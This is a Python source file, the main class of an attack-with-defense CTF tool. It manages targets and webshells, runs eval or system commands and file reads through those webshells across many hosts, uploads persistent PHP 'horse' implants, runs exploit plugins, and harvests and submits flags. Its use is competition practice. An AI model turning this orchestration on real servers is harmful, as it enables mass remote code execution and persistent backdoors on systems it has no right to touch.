from libs.Misc import Log, Config, list_rm_repeat
from libs.Data import Targets, WebShell, Cache
from libs.ShellRequest import ShellRequest
from plugs.submit import submit
import importlib
import re
import os


class Awd:
    """AWD主类"""
    def __init__(self):
        self.Targets = Targets()
        self.WebShell = WebShell()
        self.Cache = Cache()
        self.ShellRequest = ShellRequest()
        self.flag = {}   # {target: [flag]}
        self.help()

    def operate_shell(self, upload_horse=None):
        """用于操作shell和上传木马"""
        if len(self.Targets.targets) == 0:
            return Log.error("Still have not target, use command 'add_target' to add ")
        if len(self.WebShell.shell) == 0:
            return Log.error("Still have not webshell, use comomand 'add_webshell' to add")
        shell_no = 0
        if len(self.WebShell.shell) > 1:
            self.WebShell.show()
            Log.show('choose a webshell to do command, "exit" to terminate.')
            while True:
                try:
                    shell_no = input(' No>')
                    if shell_no == 'exit':
                        return
                    shell_no = int(shell_no) - 1
                    if shell_no not in range(len(self.WebShell.shell)):
                        raise Exception()
                    else:
                        break
                except:
                    Log.red('please input num 1-{}'.format(len(self.WebShell.shell)))
        shell_type = self.WebShell.shell[shell_no]['type']

        # 上传木马
        if upload_horse:
            if shell_type != 'eval':
                return Log.error('Only support upload horse by eval_shell.')
            Log.show('Input your horse dir.')
            Log.eg('UndeadHeaderHorse, WormHeaderHorse')
            horse_name = input(' upload_horse>').strip()
            if os.path.exists('horse/'+horse_name+'/Horse.php'):
                for target in self.Targets.targets:
                    Log.blue('[*] {}:{}'.format(target['ip'], target['port']), end=' ====> ')
                    self.ShellRequest.pre_operate(target)
                    upload_shell = self.ShellRequest.upload_horse(target, self.WebShell.shell[shell_no], horse_name)
                    if upload_shell:
                        self.WebShell.shell.append(upload_shell)
                        self.WebShell.shell = list_rm_repeat(self.WebShell.shell)
            else:
                Log.error("your input horse not exists.")

        # 执行代码
        else:
            flag_flag = False
            if not Config.flag_format:
                Log.show("you do not set the flag format, the flag will not be saved.")
            if shell_type == 'eval' or shell_type == 'system':
                if shell_type == 'eval':
                    payload = input(' eval_code>')
                else:
                    payload = input(' system_cmd>')
                for target in self.Targets.targets:
                    Log.blue('[*] {}:{}'.format(target['ip'], target['port']), end=' ====> ')
                    self.ShellRequest.pre_operate(target)
                    result = self.ShellRequest.eval_system_shell(target, self.WebShell.shell[shell_no], payload)
                    flag_flag = self.process_result(result, target, flag_flag)
            elif shell_type == 'readfile':
                if not Config.flag_format:
                    return Log.error("readfile must set flag format, use command 'set_flag_format' to set.")
                file_path = input(' read_file>')
                for target in self.Targets.targets:
                    Log.blue('[*] {}:{}'.format(target['ip'], target['port']), end=' ====> ')
                    self.ShellRequest.pre_operate(target)
                    result = self.ShellRequest.readfile_shell(target, self.WebShell.shell[shell_no], file_path)
                    flag_flag = self.process_result(result, target, flag_flag)
            elif shell_type == 'header':
                eval_code = input(' eval_code>')
                for target in self.Targets.targets:
                    Log.blue('[*] {}:{}'.format(target['ip'], target['port']), end=' ====> ')
                    self.ShellRequest.pre_operate(target)
                    result = self.ShellRequest.header_shell(target, self.WebShell.shell[shell_no], eval_code)
                    flag_flag = self.process_result(result, target, flag_flag)

            if flag_flag:
                Cache.save_flag(self.flag)

    def show_flag(self):
        has_flag = False
        for flag in self.flag.values():
            if flag:
                Log.green(flag)
                has_flag = True
        if not has_flag:
            return Log.error("Have not get flag.")

    def del_webshell(self):
        if len(self.WebShell.shell) == 0:
            return Log.error("Still have not webshell, use comomand 'add_webshell' to add")
        shell_no = 0
        if len(self.WebShell.shell) > 1:
            self.WebShell.show()
            Log.show('choose a webshell to do delete')
            while True:
                try:
                    shell_no = int(input(' No>')) - 1
                    if shell_no not in range(len(self.WebShell.shell)):
                        raise Exception()
                    else:
                        break
                except:
                    Log.red('please input num 1-{}'.format(len(self.WebShell.shell)))
        self.WebShell.shell.pop(shell_no)
        Log.success('delete websehll ok.')

    def submit_flag(self):
        has_flag = False
        for flags in self.flag.values():
            if flags:
                has_flag = True
        if not has_flag:
            return Log.error("Have not get flag.")
        try:
            submit(self.flag)
        except Exception as e:
            Log.error('Submit error. {}'.format(e))

    def custom_attack(self):
        """自定义攻击"""
        if len(self.Targets.targets) == 0:
            return Log.error("Still have not target, use command 'add_target' to add ")
        Log.show('Input the exp name.')
        exp_name = input(' exp_name>').strip()
        if os.path.exists('plugs/{}.py'.format(exp_name)):
            exp = importlib.import_module('plugs.{}'.format(exp_name))
            flag_flag = False
            for target in self.Targets.targets:
                ip, port = target['ip'], target['port']
                Log.blue('[*] {}:{}'.format(ip, port), end=' ====> ')
                try:
                    result = exp.attack(ip, port)
                    flag_flag = self.process_result(result, target, flag_flag)
                except Exception as e:
                    return Log.red('attack error. {}'.format(e))
            if flag_flag:
                Cache.save_flag(self.flag)
        else:
            Log.error("Your input exp not exists.")

    def custom_request(self):
        """自定义发起请求"""
        if len(self.Targets.targets) == 0:
            return Log.error("Still have not target, use command 'add_target' to add ")
        path, method, data = None, None, None
        Log.show('Input request path')
        Log.eg('/path/index.php?arg1=value1&arg2=value2')
        path = input(' path>').strip()

        while True:
            method = input(' method>').strip().upper()
            if method == 'EXIT':
                return
            if method == 'GET' or method == 'POST':
                break
            Log.error('Only support GET/POST method. Input "exit" to terminal.')
        if method == 'POST':
            data = input(' data>')

        flag_flag = False
        for target in self.Targets.targets:
            Log.blue('[*] {}:{}'.format(target['ip'], target['port']), end=' ====> ')
            try:
                result = self.ShellRequest.make_request(target, method, path, data)
                flag_flag = self.process_result(result, target, flag_flag)
            except Exception as e:
                Log.red('request error. {}'.format(e))
        if flag_flag:
            Cache.save_flag(self.flag)

    @staticmethod
    def help():
        Log.show('Usage: COMMAND\n')
        Log.show('Commands:')
        Log.help('help', 'Show this message.')
        Log.help('exit/quit', 'Exit.')
        Log.help('add_target', 'Add the target.')
        Log.help('show_targets', 'Show the targets.')
        Log.help('clear_targets', 'Clear the targets.')
        Log.help('add_webshell', 'Add the webshell.')
        Log.help('show_webshell', 'Show the webshell.')
        Log.help('del_webshell', 'Delete a webshell.')
        Log.help('do_cache', 'Save the targets, webshell to file.')
        Log.help('load_cache', 'Load the targets, webshell, flag from the file.')
        Log.help('clear_cache', 'Clear the data of the file.')
        Log.help('operate_shell', 'Operate the webshell to get flag.')
        Log.help('show_flag', 'Show the flag.')
        Log.help('upload_horse', 'Upload a horse to target server.')
        Log.help('submit_flag', 'Submit the flags.')
        Log.help('custom_attack', 'Custom attack.')
        Log.help('custom_request', 'Make a request.\n')

    def process_result(self, result, target, flag_flag):
        """从字符串中获取flag并显示，如果设置了flag_format才保存flag"""
        if result:
            if Config.flag_format:
                flag = re.findall(Config.flag_format, result)
                flag = list_rm_repeat(flag)
                if flag:
                    flag_flag = True
                    self.flag[target['ip'] + ':' + target['port']] = flag
                    Log.show(flag)
                else:
                    self.flag[target['ip'] + ':' + target['port']] = []
                    Log.show('Request ok but not get flag.')
            else:
                Log.show(result)
        elif result == '':
            Log.show('not have result.')
        return flag_flag
